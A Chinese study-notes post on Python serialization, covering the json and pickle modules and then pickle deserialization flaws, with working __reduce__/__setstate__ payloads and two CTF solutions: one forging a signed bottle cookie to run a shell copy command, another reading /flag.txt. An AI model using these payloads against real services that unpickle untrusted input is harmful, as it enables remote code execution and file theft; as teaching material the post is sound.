---
title: python反序列化
date: 2025-04-14 19:09:56
tags:
- python反序列化
category:
- 学习笔记
---

# python反序列化漏洞以及JSON模块和pickle模块

## 序列化是什么

**序列化** (Serialization)是将**对象的状态信息**转换为**可以存储或传输的形式**的过程。

## 反序列化是什么

**反序列化** (Deserialization)是将**有序的二进制序列**转换成**某种对象**（字典，列表等）的过程。

## 为什么要序列化？

**1、存储**

一个软件/程序的执行就在处理一系列状态的变化。

在编程语言中，“状态”会以各种各样有结构的**数据类型**(也可简单的理解为**变量**)的形式被保存在内存中。

**内存**无法永久保存数据，当程序运行一段时间，断电或者重启程序，内存中关于这个程序的一些数据就被**清空**了。

在断电或重启程序之前将程序当前内存中所有的数据都**保存**下来，以便于下次程序执行能够从文件中载入之前的数据就是**序列化**。

**2、传输**

因为TCP/IP协议**只支持字节数组**的传输，不能直接传**对象**。

对象序列化的结果一定是字节数组！

当两个进程在进行远程通信时，彼此可以发送各种类型的数据。无论是何种类型的数据，都会以**二进制序列**的形式在网络上传送。

发送方需要把这个对象转换为字节序列，才能在网络上传送；接收方则需要把字节序列再恢复为对象。

如果收发的双方约定好实用一种序列化的格式，那么便**打破了平台/语言差异化**带来的限制，实现了**跨平台数据交互**！

---

# JSON

**JSON(JavaScript Object Notation, JS 对象简谱)** 是一种轻量级的**数据交换格式**。

采用完全独立于编程语言的文本格式来存储和表示数据。

简洁和清晰的层次结构使得 JSON 成为理想的数据交换语言。

易于人阅读和编写，同时也易于机器解析和生成，并有效地提升网络传输效率。

JSON表示出来就是一个**字符串**，**可以被所有语言读取**，也可以方便地**存储**到磁盘或者通过网络**传输**。

JSON不仅是标准格式，并且比XML更快，而且可以**直接在Web页面中读取**，非常方便。

## JSON模块

Python3 中可以使用 json 模块来对 JSON 数据进行编解码，它主要提供了四个方法： dump、dumps、load、loads。

dump和dumps对python对象进行**序列化**。将一个Python对象进行JSON格式的编码。

load和loads反序列化方法，将json格式数据解码为Python对象。

---

## JSON模块实例

### dump和dumps函数

```
import json

# dumps可以格式化所有的基本数据类型为字符串
data1 = json.dumps([])         # 列表
print(data1, type(data1))
data2 = json.dumps(2)          # 数字
print(data2, type(data2))
data3 = json.dumps('3')        # 字符串
print(data3, type(data3))
dict = {"name": "Tom", "age": 18}   # 字典
data4 = json.dumps(dict)
print(data4, type(data4))

with open("test.json", "w", encoding='utf-8') as f:
    # indent 格式化保存字典，默认为None，小于0为零个空格。indent=4缩进4个空格
    f.write(json.dumps(dict, indent=4))
    json.dump(dict, f, indent=4)  # 传入文件描述符，和dumps一样的结果
```

得到的输出结果如下（格式化所有的数据类型为str类型）：

```
[] <class 'str'>
2 <class 'str'>
"3" <class 'str'>
{"name": "Tom", "age": 18} <class 'str'>
```

test.json中的内容：

```
{
    "name": "Tom",
    "age": 18
}
```

---

### load和loads函数

```
import json

dict = '{"name": "Tom", "age": 18}'   # 将字符串还原为dict
data1 = json.loads(dict)
print(data1, type(data1))

with open("test.json", "r", encoding='utf-8') as f:
    data2 = json.loads(f.read())    # load的传入参数为字符串类型
    print(data2, type(data2))
    f.seek(0)                       # 将文件游标移动到文件开头位置
    data3 = json.load(f)
    print(data3, type(data3))
```

运行结果如下：

```
{'name': 'Tom', 'age': 18} <class 'dict'>
{'name': 'Tom', 'age': 18} <class 'dict'>
{'name': 'Tom', 'age': 18} <class 'dict'>
```

### 读取多行的JSON文件

假如要读取一个多行的JSON文件：

```
{"坂": ["坂5742"]}
{"构": ["构6784"]}
{"共": ["共5171"]}
{"钩": ["钩94a9"]}
{"肮": ["肮80ae"]}
{"孤": ["孤5b64"]}
```

如果直接使用：

```
    with open(json_path, 'r') as f:
        json_data = json.load(f)
```

就会报错：抛出异常**JSONDecodeError**。
 表示数据错误，数据太多。

**因为json只能读取一个文档对象**，有两个解决办法：
 1、单行读取文件,一次读取一行文件。
 2、保存数据源的时候，格式写为一个对象。

1、**单行读取文件**

```python
with open(json_path, 'r') as f:
 	for line in f.readlines():
        line = line.strip()   # 使用strip函数去除空行
        if len(line) != 0:
            json_data = json.loads(line)
```

2、**合并为一个对象**

将json文件处理成一个对象文件：

```python
{"dict": [
{"坂": ["坂5742"]},
{"构": ["构6784"]},
{"共": ["共5171"]},
{"钩": ["钩94a9"]},
{"肮": ["肮80ae"]},
{"孤": ["孤5b64"]}
]}
```

然后再用：

```python
    with open(json_path, 'r') as f:
        json_data = json.loads(f.read())
```

---

# pickle模块

pickle总结与绕过：https://xz.aliyun.com/news/11253

pickle模块实现了用于对Python对象结构进行 序列化 和 反序列化 的**二进制协议**，与json模块不同的是pickle模块序列化和反序列化的过程分别叫做 pickling 和 unpickling：

- ***pickling：\*** 是将Python对象转换为字节流的过程；
- ***unpickling：\*** 是将字节流二进制文件或字节对象转换回Python对象的过程；

##  pickle模块与json模块对比

- JSON是一种文本序列化格式（它输出的是unicode文件，大多数时候会被编码为utf-8），而pickle是一个二进制序列化格式;
- JOSN是我们可以读懂的数据格式，而pickle是二进制格式，我们无法读懂；
- JSON是与特定的编程语言或系统无关的，且它在Python生态系统之外被广泛使用，而pickle使用的数据格式是特定于Python的；
- 默认情况下，JSON只能表示Python内建数据类型，对于自定义数据类型需要一些额外的工作来完成；pickle可以直接表示大量的Python数据类型，包括自定数据类型（其中，许多是通过巧妙地使用Python内省功能自动实现的；复杂的情况可以通过实现specific object API来解决）

```
# 将指定的Python对象通过pickle序列化作为bytes对象返回，而不是将其写入文件
dumps(obj, protocol=None, *, fix_imports=True)
 
# 将通过pickle序列化后得到的字节对象进行反序列化，转换为Python对象并返回
loads(bytes_object, *, fix_imports=True, encoding="ASCII", errors="strict")
 
# 将指定的Python对象通过pickle序列化后写入打开的文件对象中，等价于`Pickler(file, protocol).dump(obj)`
dump(obj, file, protocol=None, *, fix_imports=True)
 
# 从打开的文件对象中读取pickled对象表现形式并返回通过pickle反序列化后得到的Python对象
load(file, *, fix_imports=True, encoding="ASCII", errors="strict")
```

## pickle模块实例

### python 2.X

```
>>> import pickle
>>> 
>>> var_a = {'a':'str', 'c': True, 'e': 10, 'b': 11.1, 'd': None, 'f': [1, 2, 3], 'g':(4, 5, 6)}
 
# 序列化
>>> var_b = pickle.dumps(var_a)
>>> var_b
"(dp0\nS'a'\np1\nS'str'\np2\nsS'c'\np3\nI01\nsS'b'\np4\nF11.1\nsS'e'\np5\nI10\nsS'd'\np6\nNsS'g'\np7\n(I4\nI5\nI6\ntp8\nsS'f'\np9\n(lp10\nI1\naI2\naI3\nas."
 
# 反序列化
>>> var_c = pickle.loads(var_b)
>>> var_c
{'a': 'str', 'c': True, 'b': 11.1, 'e': 10, 'd': None, 'g': (4, 5, 6), 'f': [1, 2, 3]}
```

### python 3.X

```
>>> import pickle
>>>
>>> var_a = {'a':'str', 'c': True, 'e': 10, 'b': 11.1, 'd': None, 'f': [1, 2, 3], 'g':(4, 5, 6)}
 
# 序列化
>>> var_b = pickle.dumps(var_a)
>>> var_b
b'\x80\x03}q\x00(X\x01\x00\x00\x00eq\x01K\nX\x01\x00\x00\x00aq\x02X\x03\x00\x00\x00strq\x03X\x01\x00\x00\x00fq\x04]q\x05(K\x01K\x02K\x03eX\x01\x00\x00\x00gq\x06K\x04K\x05K\x06\x87q\x07X\x01\x00\x00\x00bq\x08G@&333333X\x01\x00\x00\x00cq\t\x88X\x01\x00\x00\x00dq\nNu.'
 
# 反序列化
>>> var_c = pickle.loads(var_b)
>>> var_c
{'e': 10, 'a': 'str', 'f': [1, 2, 3], 'g': (4, 5, 6), 'b': 11.1, 'c': True, 'd': None}
```

### dump()与load()

```
>>> import pickle
>>>
>>> var_a = {'a':'str', 'c': True, 'e': 10, 'b': 11.1, 'd': None, 'f': [1, 2, 3], 'g':(4, 5, 6)}
 
# 持久化到文件
>>> with open('pickle.txt', 'wb') as f:
...     pickle.dump(var_a, f)
...
 
# 从文件中读取数据
>>> with open('pickle.txt', 'rb') as f:
...     var_b = pickle.load(f)
...
>>> var_b
{'e': 10, 'a': 'str', 'f': [1, 2, 3], 'g': (4, 5, 6), 'b': 11.1, 'c': True, 'd': None}
>>>
```

*说明：*

默认情况下Python 2.x中pickled后的数据是字符串形式，需要将它转换为字节对象才能被Python 3.x中的pickle.loads()反序列化；Python 3.x中pickling所使用的协议是v3，因此需要在调用pickle.dumps()时指定可选参数protocol为Python 2.x所支持的协议版本（0,1,2），否则pickled后的数据不能被被Python 2.x中的pickle.loads()反序列化；

Python 3.x中pickle.dump()和pickle.load()方法中指定的文件对象，必须以二进制模式打开，而Python 2.x中可以以二进制模式打开，也可以以文本模式打开。

---

# python反序列化漏洞

## python序列化反序列化相关函数

```
pickle.dump(obj, file) ：将对象序列化后保存到文件。
pickle.load(file) ：读取文件， 将文件中的序列化内容反序列化为对象。
pickle.dumps(obj) ：将对象序列化成字符串格式的字节流。
pickle.loads(bytes_obj) ：将字符串格式的字节流反序列化为对象。
```

---

## python魔术方法

- __reduce__() ：反序列化时调用。
- __reduce_ex__() ：反序列化时调用。
- __setstate__() ：反序列化时调用。
- __getstate__() ：序列化时调用。

---

## python魔术方法实例详解

### <\_\_reduce\_\_>

代码实例

```
import pickle
import os

class A(object):
	def __reduce__(self):
		print('反序列化调用')
		return (os.system,('calc',))
		
a = A()
p_a = pickle.dumps(a)
pickle.loads(p_a)
print('==========')
print(p_a)
```

输出

```
//弹计算机
反序列化调用
===========

b'\x80\x04\x95\x1c\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x04calc\x94\x85\x94R\x94.'
```

---

### <\_\_setstate\_\_>

```
import pickle
import os
class SerializePerson():
    def __init__(self, name):
        self.name = name

    # 构造 __setstate__ 方法
    def __setstate__(self, name):
        os.system('calc')  # 恶意代码

tmp = pickle.dumps(SerializePerson('tom'))  # 序列化
pickle.loads(tmp)  # 反序列化 此时会弹出计算器
```

```
//弹计算机
反序列化调用
===========

b'\x80\x04\x95\x1c\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x04calc\x94\x85\x94R\x94.'
```

---

### <\_\_getstate\_\_>

```
import pickle
import os

class A(object):
    def __getstate__(self):
        print('序列化调用')
        os.system('calc')  # 执行系统命令，打开计算器

a = A()
p_a = pickle.dumps(a)  # 序列化对象a
print('===========')
print(p_a)  # 打印序列化后的对象
```

//弹计算机

```
序列化调用
===========
b'\x80\x04\x95\x15\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x01A\x94\x93\x94)\x81\x94.'
```

### 漏洞利用

先构造exp

```
import os
import pickle

class Demo(object):
    def __reduce__(self):
        shell = 'calc'
        return (os.system,(shell,))

demo = Demo()
pickle.loads(pickle.dumps(demo))
```

然后根据题目的要求比如base64编码之类的对payload进行处理，然后传入即可。

#### 例题：signning

exp

```
import os  
import requests  
from bottle import cookie_encode  
import warnings  

# 忽略特定警告  
warnings.filterwarnings("ignore", category=DeprecationWarning)  

# 自定义 secret  
secret = "Hell0_H@cker_Y0u_A3r_Sm@r7"  

class Test:  
    def __reduce__(self):  
        return (eval, ("""__import__('os').system('cp /f* ./2.txt')""",))  

# 使用 cookie_encode 编码  
exp = cookie_encode(  
    ('session', {"name": [Test()]}),  
    secret  
)  

# 发起 GET 请求并传递 cookie  
response = requests.get('http://gz.imxbt.cn:20805/secret', cookies={'name': exp.decode()})
```

#### 例题：ikun

在这题的源码中能看到调用序列化的函数

```
@tornado.web.authenticated
def post(self,*args,**kwargs)
	try:
		become = self.get_argument('become')
		p = pickle.loads(urllib.unquote(become))
		return self.render('form.html',res=p,member=1)
	except:
		return self.render('form.html',res='This is Black')
```

经过分析得知其是python2进行编码的，因此我们使用python构造payload

```
import pickle
import urllib
class payload(object):
	def __reduce__(self):
		return (eval,("open('/flag.txt','r').read()",))
a = pickle.dumps(payload())
a = urllib.quote(a)
print(a)
```

执行后可以看到成功构造了payload。

将value的值改成我们刚刚生成的payload

更改后再次点击一键成为大会员，可以看到成功获取到了flag。
